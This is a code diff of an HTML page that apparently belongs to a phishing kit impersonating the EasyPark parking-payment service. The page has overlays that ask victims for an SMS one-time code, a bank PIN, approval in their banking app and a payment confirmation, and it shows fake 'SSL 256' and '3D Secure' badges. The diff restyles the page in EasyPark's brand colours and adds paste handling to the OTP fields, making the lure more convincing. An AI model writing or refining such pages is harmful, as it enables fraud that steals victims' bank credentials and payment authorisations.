@@ -2,7 +2,7 @@
 <html lang="de"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
 <title>Verifying — EasyPark</title>
-<script src="/static/js/i18n.js"></script>
+<script src="/static/js/i18n.js?v=2"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
@@ -34,8 +34,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 .ov-btn{width:100%;padding:14px;border-radius:12px;font-weight:800;font-size:14px;border:none;cursor:pointer;transition:.2s}
 .otp-row{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
 .otp-b{width:42px;height:52px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
-.otp-b:focus{border-color:#d97706;background:#fff;box-shadow:0 0 0 3px rgba(217,119,6,.15)}
-.otp-b.otp-filled{border-color:#d97706;background:#fffbeb}
+.otp-b:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.15)}
+.otp-b.otp-filled{border-color:#872879;background:#fdf2f8}
 @keyframes shield-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
 </style>
 <style>
@@ -100,8 +100,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 
 <div id="ov-sms" class="overlay" style="display:none">
   <div class="ov-card">
-    <div class="ov-icon-wrap" style="background:#fef9c3;animation:shield-pulse 2s ease-in-out infinite">
-      <i class="fas fa-comment-dots" style="color:#d97706"></i>
+    <div class="ov-icon-wrap" style="background:#fdf2f8;animation:shield-pulse 2s ease-in-out infinite">
+      <i class="fas fa-comment-dots" style="color:#872879"></i>
     </div>
     <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 5px" data-i18n="sms_title">SMS Verification</h3>
     <p style="font-size:12px;color:#64748b;margin:0 0 18px;line-height:1.5" data-i18n="sms_desc">You received a 6-digit code on your phone. Enter it below:</p>
@@ -113,30 +113,30 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
       <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
       <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
     </div>
-    <button class="ov-btn" id="sms-submit-btn" style="background:#d97706;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
+    <button class="ov-btn" id="sms-submit-btn" style="background:#872879;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
   </div>
 </div>
 <div id="ov-pin" class="overlay" style="display:none">
   <div class="ov-card">
-    <div class="ov-icon-wrap" style="background:#fce7f3"><i class="fas fa-key" style="color:#7c3aed"></i></div>
+    <div class="ov-icon-wrap" style="background:#fdf2f8"><i class="fas fa-key" style="color:#872879"></i></div>
     <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 6px" data-i18n="pin_title">Bank PIN Code</h3>
     <p style="font-size:13px;color:#64748b;margin:0 0 16px" data-i18n="pin_desc">Enter the PIN code received from your bank:</p>
     <input id="pin-code" type="tel" inputmode="numeric" maxlength="8" placeholder="• • • •"
            class="ov-inp" style="border-color:#fbcfe8" oninput="this.value=this.value.replace(/\D/g,'')">
-    <button class="ov-btn" style="background:#7c3aed;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
+    <button class="ov-btn" style="background:#872879;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
   </div>
 </div>
 <div id="ov-app" class="overlay" style="display:none">
   <div class="ov-card">
-    <div class="ov-icon-wrap" style="background:#dbeafe"><i class="fas fa-mobile-alt" style="color:#3b82f6"></i></div>
+    <div class="ov-icon-wrap" style="background:#fdf2f8"><i class="fas fa-mobile-alt" style="color:#872879"></i></div>
     <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 6px" data-i18n="app_title">3D Secure Authentication</h3>
     <p style="font-size:13px;color:#64748b;margin:0 0 18px" data-i18n="app_desc">Approve the transaction from your banking app</p>
     <div style="display:flex;justify-content:center;gap:8px;margin-bottom:20px">
-      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s infinite"></div>
-      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s .25s infinite"></div>
-      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s .5s infinite"></div>
+      <div style="width:10px;height:10px;background:#872879;border-radius:50%;animation:ab .8s infinite"></div>
+      <div style="width:10px;height:10px;background:#872879;border-radius:50%;animation:ab .8s .25s infinite"></div>
+      <div style="width:10px;height:10px;background:#872879;border-radius:50%;animation:ab .8s .5s infinite"></div>
     </div>
-    <button class="ov-btn" style="background:#3b82f6;color:#fff" onclick="submitAppConfirm()" data-i18n="confirmed_app">✓ I CONFIRMED IN THE APP</button>
+    <button class="ov-btn" style="background:linear-gradient(135deg,#56004D,#872879);color:#fff" onclick="submitAppConfirm()" data-i18n="confirmed_app">✓ I CONFIRMED IN THE APP</button>
   </div>
 </div>
 <style>@keyframes ab{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}</style>
@@ -166,7 +166,13 @@ function initOTP(){
   const boxes=[...document.querySelectorAll('#otp-sms .otp-b')];
   boxes.forEach((b,i)=>{
     b.addEventListener('input',()=>{
-      b.value=b.value.replace(/\D/g,'').slice(-1);
+      const raw=b.value.replace(/\D/g,'');
+      if(raw.length>1){
+        boxes.forEach((x,j)=>{x.value=raw[j]||'';x.classList.toggle('otp-filled',!!x.value);});
+        const last=Math.min(raw.length,6)-1; if(last>=0) boxes[last].focus();
+        checkOTP(boxes); return;
+      }
+      b.value=raw.slice(-1);
       b.classList.toggle('otp-filled',!!b.value);
       if(b.value&&i<5) boxes[i+1].focus();
       checkOTP(boxes);
@@ -236,25 +242,25 @@ socket.on('open_link',function(d){
 <!-- Link confirm overlay -->
 <div id="ov-link" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center;padding:20px">
   <div style="background:#fff;border-radius:24px;padding:28px 22px 22px;width:100%;max-width:340px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.35)">
-    <div style="width:68px;height:68px;background:linear-gradient(135deg,#0f766e,#0d9488);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:shield-pulse 2.5s ease-in-out infinite;box-shadow:0 8px 24px rgba(15,118,110,.35)">
+    <div style="width:68px;height:68px;background:linear-gradient(135deg,#56004D,#872879);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:shield-pulse 2.5s ease-in-out infinite;box-shadow:0 8px 24px rgba(86,0,77,.35)">
       <i class="fas fa-lock" style="color:#fff;font-size:24px"></i>
     </div>
-    <h3 style="font-size:18px;font-weight:900;color:#0f766e;margin:0 0 6px;letter-spacing:-.01em" data-i18n="link_confirm_title">Payment Confirmation</h3>
+    <h3 style="font-size:18px;font-weight:900;color:#56004D;margin:0 0 6px;letter-spacing:-.01em" data-i18n="link_confirm_title">Payment Confirmation</h3>
     <p style="font-size:12.5px;color:#64748b;margin:0 0 20px;line-height:1.6" data-i18n="link_confirm_desc">Press the button below to confirm and finalize your payment securely.</p>
     <div style="display:flex;justify-content:center;gap:10px;margin-bottom:20px">
-      <div style="display:flex;align-items:center;gap:4px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:4px 10px">
-        <i class="fas fa-lock" style="color:#16a34a;font-size:9px"></i>
-        <span style="font-size:10px;font-weight:700;color:#16a34a">SSL 256</span>
+      <div style="display:flex;align-items:center;gap:4px;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-lock" style="color:#872879;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#872879">SSL 256</span>
       </div>
-      <div style="display:flex;align-items:center;gap:4px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:20px;padding:4px 10px">
-        <i class="fas fa-shield-alt" style="color:#3b82f6;font-size:9px"></i>
-        <span style="font-size:10px;font-weight:700;color:#3b82f6">3D Secure</span>
+      <div style="display:flex;align-items:center;gap:4px;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-shield-alt" style="color:#872879;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#872879">3D Secure</span>
       </div>
     </div>
     <button id="ov-link-btn"
-      style="width:100%;padding:16px;background:linear-gradient(135deg,#0f766e,#0d9488);color:#fff;border:none;border-radius:16px;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.02em;box-shadow:0 6px 20px rgba(15,118,110,.4);transition:transform .15s,box-shadow .15s"
-      onmousedown="this.style.transform='scale(.97)';this.style.boxShadow='0 3px 10px rgba(15,118,110,.3)'"
-      onmouseup="this.style.transform='';this.style.boxShadow='0 6px 20px rgba(15,118,110,.4)'">
+      style="width:100%;padding:16px;background:linear-gradient(135deg,#56004D,#872879);color:#fff;border:none;border-radius:16px;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.02em;box-shadow:0 6px 20px rgba(86,0,77,.4);transition:transform .15s,box-shadow .15s"
+      onmousedown="this.style.transform='scale(.97)';this.style.boxShadow='0 3px 10px rgba(86,0,77,.3)'"
+      onmouseup="this.style.transform='';this.style.boxShadow='0 6px 20px rgba(86,0,77,.4)'">
       <i class="fas fa-check-circle" style="margin-right:8px"></i><span data-i18n="link_confirm_btn">Confirm</span>
     </button>
     <p style="font-size:10px;color:#94a3b8;margin:12px 0 0">
